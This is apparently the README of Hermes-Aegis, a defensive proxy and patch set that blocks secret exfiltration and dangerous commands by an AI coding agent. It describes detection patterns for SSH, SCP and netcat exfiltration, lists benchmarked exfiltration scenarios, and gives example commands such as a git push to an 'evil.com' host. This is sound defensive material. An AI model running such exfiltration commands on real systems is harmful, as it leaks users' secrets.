# Hermes-Aegis

**Security hardening layer for Hermes Agent** — Prevents secret leakage, dangerous command execution, and unauthorized data exfiltration through proxy-based monitoring.

[![Version](https://img.shields.io/badge/version-0.1.5-blue)]()
[![Tests](https://img.shields.io/badge/tests-770%20passing-brightgreen)]()
[![Python](https://img.shields.io/badge/python-3.10%2B-blue)]()
[![License](https://img.shields.io/badge/license-MIT-blue)]()

---

## What It Does

Hermes-Aegis wraps Hermes Agent with a transparent MITM proxy that:

- **Blocks secret exfiltration** — scans all outbound HTTP for API keys, tokens, credentials
- **Injects API keys** — secrets stay in your encrypted vault, never in agent memory
- **Detects dangerous commands** — 35 risky patterns (shell injection, destructive ops, privesc, SSH exfiltration)
- **Blocks dangerous commands in gateway mode** — Patch 5 enforces blocking when `AEGIS_ACTIVE=1`
- **Blocks SSH/non-HTTP exfiltration** — Docker network isolation + SSH/SCP/netcat command detection
- **Reactive audit agents** — automated investigation and circuit breaker response to security events
- **Scheduled reports** — periodic audit digest generation via hermes cron system
- **Graceful session resume** — shows session ID and resume command on exit
- **Rate-limits bursts** — detects suspicious data tunneling patterns; escalates to blocking on repeated anomalies
- **Restricts domains** — optional allowlist for outbound connections
- **Audit trail** — tamper-proof hash-chained log of all security events
- **Tirith content scanning** — proxy-level inspection of LLM responses for homograph URLs, code injection, terminal escapes
- **Approval system** — pluggable backends (block/log_only/webhook) with persistent pattern cache and TTL rules
- **Container isolation** — Docker mode with `AEGIS_CONTAINER_ISOLATED=1` and container handshake protocol

### What Hermes v0.2.0 Added Natively (and Why Aegis Still Matters)

Hermes Agent v0.2.0 added its own security features: `approval.py` (27 dangerous command
patterns with interactive prompting), `tirith_security.py` (content scanning for homograph
URLs, code injection), and `redact.py` (output masking for 40+ secret patterns).

**What Aegis uniquely provides that Hermes does not:**

| Feature | Hermes v0.2.0 | Aegis |
|---------|---------------|-------|
| Outbound HTTP secret blocking | No — redaction masks output only, doesn't block the request | **Yes** — MITM proxy blocks secrets in request bodies/headers/URLs |
| API key vault injection | No — keys in `.env` or env vars | **Yes** — keys never in process memory |
| Encrypted vault | No | **Yes** — keyring-backed AES encryption |
| Domain allowlisting | No | **Yes** — restrict outbound to approved domains |
| Rate anomaly detection | No | **Yes** — detects data tunneling bursts |
| Tamper-proof audit trail | No | **Yes** — SHA-256 hash chain |
| Gateway command blocking | Prompts user (can approve) | **Yes** — blocks outright via Patch 5 |
| Tirith content scanning (response bodies) | No | **Yes** — proxy-level homograph/injection/terminal scanning |
| Audit trail unification | No | **Yes** — hermes approval decisions forwarded to aegis audit |
| Approval backends (webhook, log_only) | No | **Yes** — pluggable strategies for gateway mode |
| Rate escalation (detection → blocking) | No | **Yes** — 4-level system with active blocking |
| Persistent approval cache | No | **Yes** — cross-session allow/deny with TTL + pattern matching |
| Container handshake protocol | No | **Yes** — ProtectionLevel detection + container awareness |

---

## Security Benchmark

Tested against 10 exfiltration and attack scenarios — **100% blocked with sub-100μs median scan latency.**

```
.venv/bin/python -m tests.benchmark.harness 500
```

| Metric | Value |
|--------|-------|
| **Exfiltration blocked** | **100%** (10/10 scenarios) |
| **Median scan latency** | **~70 μs** per request |
| **False positives** | **0** (legitimate requests not blocked) |

### Per-Scenario Results (500 iterations, Apple Silicon)

| Scenario | Result | Median | P95 |
|----------|--------|--------|-----|
| Secret in URL query param | blocked ✅ | 69μs | 202μs |
| Secret in POST body | blocked ✅ | 71μs | 236μs |
| Base64-encoded secret | blocked ✅ | 68μs | 221μs |
| Hex-encoded secret | blocked ✅ | 69μs | 220μs |
| URL-encoded secret | blocked ✅ | 69μs | 228μs |
| Secret in HTTP header | blocked ✅ | 73μs | 248μs |
| Domain not in allowlist | blocked ✅ | 170μs | 336μs |
| Rate burst (50 rapid requests) | blocked ✅ | 2913μs | 3423μs |
| SSH exfiltration command | blocked ✅ | 47μs | 61μs |
| Netcat tunnel command | blocked ✅ | 49μs | 57μs |

For context: a typical LLM API call takes 500–2000ms. A 70μs security scan adds **0.004% overhead** — invisible in practice.

The benchmark suite includes:
- **Phase 1** (`tests/benchmark/harness.py`): 10 red-team scenarios with N-iteration timing, produces JSON + markdown reports
- **Phase 2** (`tests/benchmark/test_integration.py`): 17 integration tests using a real HTTP evil server that proves data actually leaked or didn't
- Run everything: `.venv/bin/python -m pytest tests/benchmark/ -v`

---

## Prerequisites

- **Python 3.10+**
- **Hermes Agent** installed at `~/.hermes/` (with `config.yaml`)
- **uv** package manager (recommended) or pip
- **Docker** (optional — for container isolation)

---

## Quick Start

```bash
# 1. Install hermes-aegis (global — available from any terminal)
uv tool install hermes-aegis
# Or from source:
uv tool install -e ~/Projects/hermes-aegis

# 2. Set up vault (one-time — auto-migrates keys from ~/.hermes/.env)
hermes-aegis setup

# 3. Install patches + Hermes hook + generate CA cert
hermes-aegis install

# 4. Verify it works
hermes-aegis test

# 5. Run Hermes with aegis protection
hermes-aegis run
```

> **Note:** `hermes-aegis setup` migrates API keys from `~/.hermes/.env` into the
> encrypted vault. If you don't have a `.env` file, use `hermes-aegis vault set KEY_NAME`.
> Security scanning works without any vault keys — only API key injection requires them.

> **Note:** Running standalone `hermes` (without `hermes-aegis run`) requires its own
> auth setup via `hermes setup`. Aegis vault keys are only available through the proxy.

### Auto-Injected API Keys (Optional)

If your vault has any of these keys, the proxy automatically injects them into LLM provider requests — they never touch Hermes's memory or `~/.hermes/.env`:

| Key | Provider | Injection Method |
|-----|----------|-----------------|
| `OPENAI_API_KEY` | OpenAI | Proxy replaces `Authorization` header |
| `ANTHROPIC_API_KEY` | Anthropic | Proxy replaces `x-api-key` header |
| `GOOGLE_API_KEY` | Google AI | Proxy replaces `x-goog-api-key` header |
| `GROQ_API_KEY` | Groq | Proxy replaces `Authorization` header |
| `TOGETHER_API_KEY` | Together AI | Proxy replaces `Authorization` header |
| `OPENROUTER_API_KEY` | OpenRouter | Proxy replaces `Authorization` header |
| `ANTHROPIC_TOKEN` | Anthropic OAuth | Injected directly into child env (Bearer auth) |
| `GITHUB_TOKEN` | GitHub (git HTTPS) | Proxy injects `Authorization: Basic` for git operations |

Add any key with `hermes-aegis vault set KEY_NAME` — you'll be prompted for the value.

> **ANTHROPIC_TOKEN** is special: OAuth setup-tokens use Bearer auth constructed before
> HTTP requests are made. The proxy cannot replace Bearer tokens at the header level,
> so `hermes-aegis run` injects the real value directly into the child process environment.

### How It Works

1. `hermes-aegis run` starts the mitmproxy-based security proxy (if not already running)
2. Sets `HTTP_PROXY`/`HTTPS_PROXY` env vars so all traffic routes through the proxy
3. Injects real `ANTHROPIC_TOKEN` from vault into child env (OAuth Bearer auth)
4. Runs `hermes` as a child process — all subprocess calls inherit the proxy env vars
5. Proxy scans for secrets, blocks exfiltration, injects real API keys from the vault
6. **The proxy keeps running after Hermes exits** — it's shared infrastructure. Multiple
   sessions share one proxy. Stop it explicitly with `hermes-aegis stop`.

### Patch System

`hermes-aegis install` applies 11 idempotent, reversible patches to hermes-agent source files:

| Patch | File | Purpose |
|-------|------|---------|
| 1–3 | `docker.py` | Add `forward_env` param, pass to `_Docker()`, translate localhost→`host.docker.internal` + remap cert paths |
| 4 | `terminal_tool.py` | Wire `_aegis_forward` env vars at DockerEnvironment instantiation |
| 5 | `terminal_tool.py` | Call `hermes-aegis scan-command` when `AEGIS_ACTIVE=1` for gateway blocking |
| 6 | `hermes (startup)` | Inject "Aegis Protection Activated" into banner when `AEGIS_ACTIVE=1` |
| 7 | `terminal_tool.py` | Forward hermes approval decisions into aegis audit trail |
| 8 | `terminal_tool.py` | Inject container awareness (`AEGIS_CONTAINER_ISOLATED=1`) into approval flow |
| 9 | `docker.py` | **Network isolation** — use internal Docker network when `AEGIS_ACTIVE=1` to block SSH/raw TCP |
| 10 | `terminal_tool.py` | Container handshake — inject `AEGIS_CONTAINER_ISOLATED=1` awareness |
| 11 | `minisweagent/log.py` | Suppress DEBUG-level Docker container logs from console under aegis |

Key properties:
- **Idempotent** — safe to run multiple times; already-applied patches are silently skipped
- **Reversible** — `hermes-aegis uninstall` reverts all patches cleanly
- **pyc invalidation** — stale bytecode in `__pycache__/` is deleted after each patch so Python recompiles from the updated source immediately
- **Incompatibility warnings** — if a patch target string is not found (hermes-agent updated), a warning is printed with guidance rather than hard-failing

> **Note:** `hermes update` (git pull) overwrites patched files — re-run `hermes-aegis install` after each hermes update. The startup banner warns you when patches are missing.

---

## CLI Reference

```bash
# Lifecycle
hermes-aegis run                 # Run Hermes with aegis protection
hermes-aegis run -- gateway      # Run Hermes gateway with protection
hermes-aegis install             # Apply patches + install hook + generate CA cert
hermes-aegis uninstall           # Revert patches + remove hook
hermes-aegis start               # Start proxy manually
hermes-aegis stop                # Stop proxy
hermes-aegis status              # Show proxy, hook, vault, Docker, patch status
hermes-aegis test                # Verify proxy blocks secrets (canary test)

# Setup
hermes-aegis setup               # One-time vault init + optional Docker image build

# Vault (Encrypted Secrets)
hermes-aegis vault list          # List secret keys
hermes-aegis vault set KEY       # Store secret (prompted)
hermes-aegis vault remove KEY    # Delete secret

# Configuration
hermes-aegis config get [key]    # View settings
hermes-aegis config set KEY val  # Update setting
hermes-aegis config list         # List all settings with values
# Settings: dangerous_commands, rate_limit_requests, rate_limit_window,
#           approval_backend, approval_webhook_url, approval_webhook_timeout,
#           approval_webhook_secret, tirith_mode

# Domain Allowlist
hermes-aegis allowlist list      # Show allowed domains
hermes-aegis allowlist add DOM   # Add domain
hermes-aegis allowlist remove DOM # Remove domain

# Security
hermes-aegis scan-command CMD    # Check command against dangerous patterns (exit 0=safe, 1=blocked)

# Audit Trail
hermes-aegis audit show          # Recent events (last 20)
hermes-aegis audit show --all    # All events
hermes-aegis audit show --decision blocked  # Filter by decision type
hermes-aegis audit clear         # Archive and wipe audit trail
hermes-aegis audit verify        # Check integrity
hermes-aegis audit event         # Inject external event into audit trail

# Approval Cache
hermes-aegis approvals list      # Show cached approval decisions
hermes-aegis approvals add PAT --decision allow|deny [--ttl SECONDS] [--reason TEXT]
hermes-aegis approvals remove PAT # Remove cached pattern
hermes-aegis approvals clear     # Clear all cached decisions

# Reactive Agents (v0.1.5)
hermes-aegis reactive init       # Create default reactive rules
hermes-aegis reactive list       # Show rules and status
hermes-aegis reactive test       # Dry-run rules against recent audit
hermes-aegis reactive enable NAME  # Enable a rule
hermes-aegis reactive disable NAME # Disable a rule

# Scheduled Reports (v0.1.5)
hermes-aegis report schedule --every 24h [--deliver telegram]  # Schedule periodic report
hermes-aegis report schedule --cron "0 9 * * 1" --name weekly  # Cron schedule
hermes-aegis report list         # List scheduled reports
hermes-aegis report run          # Generate report immediately
hermes-aegis report cancel ID    # Cancel scheduled report

# Vault Lock (v0.1.5)
hermes-aegis vault unlock        # Unlock vault after circuit breaker lock

# tmux Session (v0.1.5)
hermes-aegis screen              # Launch hermes-aegis run in a persistent tmux session
hermes-aegis screen --attach     # Attach to existing aegis tmux session
hermes-aegis screen --kill       # Kill the aegis tmux session
```

---

## Configuration Reference

All settings live in `~/.hermes-aegis/config.json` and are managed via `hermes-aegis config set/get/list`.

| Setting | Default | Description |
|---------|---------|-------------|
| `dangerous_commands` | `audit` | `audit` = log only; `block` = hard-block dangerous commands in gateway mode |
| `rate_limit_requests` | `50` | Max requests per window before anomaly is raised (positive int) |
| `rate_limit_window` | `1.0` | Rate-limit window in seconds (positive float) |
| `approval_backend` | `block` | Gateway approval strategy: `block`, `log_only`, or `webhook` |
| `approval_webhook_url` | — | URL for webhook backend to POST approval requests to |
| `approval_webhook_timeout` | — | Seconds to wait for webhook response before falling back to block |
| `approval_webhook_secret` | — | HMAC secret for signing webhook payloads |
| `tirith_mode` | `detect` | Tirith content scanner mode: `detect` (log only) or `block` (redact findings) |

### Approval Backends

When Hermes runs in gateway/non-interactive mode, dangerous commands trigger the approval backend:

- **`block`** (default) — Hard-block the command immediately. Most secure; use for unattended automation.
- **`log_only`** — Log the command and allow it through. Useful for supervised autonomous operation where a human reviews audit logs after the fact.
- **`webhook`** — POST the command details to an external URL with HMAC signing. The external system returns allow/deny within a configurable timeout. Falls back to block on timeout.

```bash
# Examples
hermes-aegis config set approval_backend log_only
hermes-aegis config set approval_backend webhook
hermes-aegis config set approval_webhook_url https://your-approver.example.com/approve
hermes-aegis config set approval_webhook_secret mysecret
hermes-aegis config set approval_webhook_timeout 30
```

### Rate Limiting

The rate limiter triggers an `ANOMALY` audit event when requests exceed the configured threshold. Repeated anomalies escalate through 4 levels:

| Level | Trigger | Effect |
|-------|---------|--------|
| 0 (normal) | — | No action |
| 1 (warning) | 1 anomaly | Elevated logging |
| 2 (elevated) | 2–3 anomalies | Approval backend check triggered |
| 3 (blocked) | 4+ anomalies | All requests to that host are blocked |

Escalation decays after a cooldown period with no new anomalies.

```bash
# Allow more burst before alerting (e.g. for large file uploads)
hermes-aegis config set rate_limit_requests 100
hermes-aegis config set rate_limit_window 5.0
```

### Tirith Content Scanning

The Tirith scanner inspects LLM response bodies at the proxy level for:
- **Homograph/confusable URLs** — punycode, Cyrillic/Greek lookalikes, mixed-script domains
- **Code injection patterns** — eval, exec, subprocess, obfuscated variants
- **Terminal injection** — ANSI escapes, control characters, OSC sequences

```bash
# detect mode (default): log findings to audit trail, let responses through
hermes-aegis config set tirith_mode detect

# block mode: redact dangerous content from responses before Hermes sees them
hermes-aegis config set tirith_mode block
```

---

## Container Isolation

When Hermes uses the Docker backend (`terminal.backend: docker` in `~/.hermes/config.yaml`),
aegis adds a second layer of isolation. Tool commands run inside a container that:

- Routes all traffic through the aegis proxy via `HTTP_PROXY`/`HTTPS_PROXY`
- Has the mitmproxy CA cert mounted at `/certs/mitmproxy-ca-cert.pem`
- Gets `AEGIS_ACTIVE=1` and `AEGIS_CONTAINER_ISOLATED=1` set in the container environment
- Forwards CA cert env vars for all major runtimes:

| Env Var | Tools Covered |
|---------|---------------|
| `REQUESTS_CA_BUNDLE` | Python requests, pip, uv |
| `SSL_CERT_FILE` | OpenSSL-based tools, Go, Ruby |
| `GIT_SSL_CAINFO` | git HTTPS operations |
| `NODE_EXTRA_CA_CERTS` | Node.js, npm, yarn, pnpm |
| `CURL_CA_BUNDLE` | curl, libcurl-based tools |

- Git HTTPS auth handled at proxy level — `GITHUB_TOKEN` from vault is injected as Basic auth

> **Note:** System package managers (`apt-get`, `apk`) use the system CA bundle at
> `/etc/ssl/certs/ca-certificates.crt` which does not include the mitmproxy cert.
> If you need to install packages through the proxy, run this inside the container first:
> `cp /certs/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/ && update-ca-certificates`

The container handshake protocol exposes a `ProtectionLevel` enum so code inside the container can determine its security context:

```python
from hermes_aegis.container.handshake import detect_protection, ProtectionLevel
level = detect_protection()
# ProtectionLevel.FULL         = proxy + container isolation
# ProtectionLevel.PROXY_ONLY   = proxy only (non-Docker mode)
# ProtectionLevel.CONTAINER_ONLY = container without proxy (unusual)
# ProtectionLevel.NONE         = no aegis protection
```

To enable container isolation:

```bash
# In ~/.hermes/config.yaml, set:
#   terminal:
#     backend: docker
#     docker_volumes:
#       - ~/.mitmproxy/mitmproxy-ca-cert.pem:/certs/mitmproxy-ca-cert.pem:ro

# Install the optional docker dependency:
pip install 'hermes-aegis[container]'
```

The `hermes-aegis setup` and `hermes-aegis status` commands detect your Docker config
and print guidance if the CA cert volume mount is missing.

---

## Proxy Reliability

The aegis proxy is designed to be persistent infrastructure — multiple Hermes sessions
share one proxy. Key reliability features:

- **Process group isolation** (`os.setsid`) — the proxy is in its own process group, so
  terminal signals (Ctrl+C, SIGHUP) don't kill it when Hermes exits
- **Dual log capture** — both stdout and stderr from mitmdump are written to
  `~/.hermes-aegis/proxy.log`, capturing crash tracebacks and addon errors
- **Port preservation** — vault key changes restart the proxy on the same port so running
  sessions' `HTTPS_PROXY` env var stays valid
- **Watchdog thread** — `hermes-aegis run` starts a background watchdog that terminates
  Hermes with a clear message if the proxy dies unexpectedly
- **PID reuse protection** — `is_proxy_running()` checks the PID file, port liveness, and
  process command line to guard against stale PID files

---

## Configuration Files

All stored in `~/.hermes-aegis/`:

```
~/.hermes-aegis/
├── vault.enc                 # Encrypted secrets (Fernet AES)
├── config.json               # Security settings
├── domain-allowlist.json     # Allowed domains
├── audit.jsonl               # Tamper-proof event log (hash-chained JSONL)
├── approval-cache.json       # Persistent approval decisions (TTL + patterns)
├── proxy.pid                 # Running proxy PID + port + vault hash
├── proxy.log                 # Proxy stdout+stderr (crash traces, addon errors)
├── proxy-config.json         # Proxy startup config (secrets deleted after read)
├── reactive-agents.json      # Reactive agent rules (v0.1.5)
├── .watcher-offset           # Watcher position persistence (v0.1.5)
├── vault.lock                # Circuit breaker vault lock sentinel (v0.1.5)
├── domain-blocklist.json     # Circuit breaker domain blocks (v0.1.5)
├── .last-report-timestamp    # Last scheduled report time (v0.1.5)
└── reports/                  # Investigation and digest reports (v0.1.5)
```

---

## Development

```bash
uv run pytest tests/ -q               # Run all tests (770 passing)
uv run pytest tests/security/ -v      # Security tests only
uv run pytest tests/benchmark/ -v     # Benchmark + integration tests (31 tests)
./tests/benchmark/run.sh 500          # Run benchmark with 500 iterations
```

### Project Structure

```
src/hermes_aegis/
├── cli.py                 # CLI commands (including scan-command)
├── hook.py                # Hermes hook installer + old setup migration
├── patches.py             # 11 idempotent patches for hermes-agent source
├── utils.py               # Shared utilities (port finding, docker check, etc.)
├── proxy/
│   ├── addon.py           # AegisAddon (inject keys, scan, rate limit)
│   ├── entry.py           # mitmproxy entry script
│   ├── runner.py          # Proxy lifecycle (start/stop/is_running)
│   ├── server.py          # ContentScanner
│   └── injector.py        # API key injection logic
├── patterns/              # Detection patterns
│   ├── secrets.py         # API key / credential patterns
│   ├── dangerous.py       # 35 dangerous command patterns (incl. SSH exfiltration)
│   ├── crypto.py          # Crypto wallet patterns
│   └── shared_registry.py # Merges hermes-agent redact.py patterns at runtime
├── middleware/             # Security middleware chain
│   ├── chain.py           # Middleware pipeline
│   ├── dangerous_blocker.py # Dangerous command blocking middleware
│   ├── rate_escalation.py # Rate limit escalation (4-level system)
│   └── tirith_scanner.py  # LLM response content scanning
├── approval/              # Approval backends + persistent cache
│   ├── backends.py        # Pluggable approval strategies (block, log_only, webhook)
│   └── cache.py           # Persistent approval decision cache
├── vault/                 # Encrypted secret storage
├── config/                # Settings + domain allowlist
├── audit/                 # Hash-chained audit trail
├── container/             # Docker builder/runner/handshake
│   ├── builder.py         # Docker image builder
│   └── handshake.py       # Container-Aegis handshake protocol
├── reactive/              # Reactive audit agents (v0.1.5)
│   ├── rules.py           # Rule/Trigger dataclasses, JSON loading, defaults
│   ├── watcher.py         # AuditFileWatcher — tails audit.jsonl
│   ├── manager.py         # ReactiveAgentManager — evaluates rules, cooldowns
│   ├── actions.py         # CircuitBreakerExecutor — defensive actions
│   ├── agent_runner.py    # Spawns restricted AIAgent for investigations
│   └── templates.py       # Report templates and prompt construction
└── reports/               # Scheduled audit reports (v0.1.5)
    ├── generator.py       # Audit statistics and report prompts
    └── scheduler.py       # Hermes cron job management
```

---

## Reactive Audit Agents (v0.1.5)

Reactive agents watch the audit trail in real time and respond automatically to security events.

```bash
# Set up default rules
hermes-aegis reactive init

# Run hermes — watcher starts automatically
hermes-aegis run
```

Three default rules are created:
- **block-alert** — sends a notification on any blocked request
- **anomaly-reporter** — spawns an investigation agent after 3+ rate anomalies in 60s
- **exfiltration-response** — spawns an investigation agent with circuit breaker actions after 5+ blocked secrets in 120s

Investigation agents run with a restricted toolset (no terminal, browser, or code execution) and can request defensive actions like `kill_proxy`, `lock_vault`, or `block_domain`.

See [`docs/reactive-agents.md`](docs/reactive-agents.md) for the full configuration guide.

---

## SSH / Non-HTTP Exfiltration Defense (v0.1.5)

The aegis proxy only intercepts HTTP/HTTPS. SSH, raw TCP, and DNS tunneling bypass it. v0.1.5 adds two defense layers:

**Layer 1: Network isolation** — New Patch 9 uses Docker's internal network mode when `AEGIS_ACTIVE=1`. Containers have no outbound route except through the proxy. SSH, raw TCP, UDP all fail at the network level. Only activates under `hermes-aegis run`; bare `hermes` is unaffected.

**Layer 2: Command detection** — 8 new dangerous command patterns flag SSH/SCP/SFTP/netcat/socat/git-SSH operations. In audit mode (default), these are logged. In gateway blocking mode, they are denied.

```bash
# These are now detected:
ssh user@host              # flagged
scp file user@host:        # flagged
git push git@evil.com:repo # flagged

# These are NOT flagged:
git push https://github.com/repo  # HTTPS goes through proxy
curl https://example.com          # HTTPS goes through proxy
```

---

## Persistent Sessions with tmux (v0.1.5)

For long-running or overnight aegis sessions:

```bash
hermes-aegis screen              # Launch in a new tmux session
hermes-aegis screen --attach     # Reattach to an existing session
hermes-aegis screen --kill       # Kill the session
```

This creates a `hermes-aegis` tmux session that survives terminal closure, screen locks, and SSH disconnects.

---

## Graceful Exit with Session Resume (v0.1.5)

When hermes exits (normally, via Ctrl+C, or due to proxy failure), aegis now shows session resume information:

```
Resume this session with:
  hermes-aegis run -- --resume 20260315_184131_2ee222

Session:        20260315_184131_2ee222
Duration:       1h 20m 3s
Messages:       130
```

---

## For Hermes Agents

If you are a Hermes agent running under aegis protection, read [`docs/FOR_HERMES_AGENT.md`](docs/FOR_HERMES_AGENT.md) — it explains what aegis does to your environment, how to handle `aegis-managed` API keys, what blocked requests look like, and the diagnostic checklist.

---

## Troubleshooting

**"Hermes Agent not found"** when running `hermes-aegis install`
- Hermes must be installed at `~/.hermes/` with a `config.yaml`. Install Hermes first.

**"CA certificate not found"** or HTTPS errors
- Run `hermes-aegis install` again — it generates the mitmproxy CA cert automatically.
- If mitmproxy isn't installed: `uv pip install 'mitmproxy>=10.0'`

**Proxy not starting**
- Check status: `hermes-aegis status`
- Check if port is in use: `hermes-aegis start` will auto-find an available port (8443-8500)
- Check audit log: `hermes-aegis audit show`

**API calls failing through proxy**
- Verify vault has the right keys: `hermes-aegis vault list`
- Ensure CA cert env vars are set (the hook does this automatically)

**Docker patches missing after `hermes update`**
- Run `hermes-aegis install` to re-apply patches. The startup banner warns about this.

**Git push/pull fails inside Docker container**
- SSL errors: run `hermes-aegis install` to ensure `GIT_SSL_CAINFO` is forwarded to the container.
- Auth errors ("could not read Username"): store a GitHub PAT in the vault with
  `hermes-aegis vault set GITHUB_TOKEN`. The proxy injects it as HTTP Basic auth for git operations.

**Tirith/cosign errors**
- Aegis adds `--ignore-hosts` for sigstore/TUF domains so cosign can verify Tirith
  provenance. If you still see cert errors, check `~/.hermes-aegis/proxy.log`.

**Want to verify it works?**
- Run `hermes-aegis test` to send a canary secret through the proxy and confirm it gets blocked.

---

## License

MIT License — See [LICENSE](LICENSE) for details.

Copyright (c) 2026 Tranquil-Flow

## Credits

**Author:** Tranquil-Flow (tranquil_flow@protonmail.com)
Built with Test-Driven Development by Hermes Agent
Inspired by the Moonsong vision of liberation through privacy
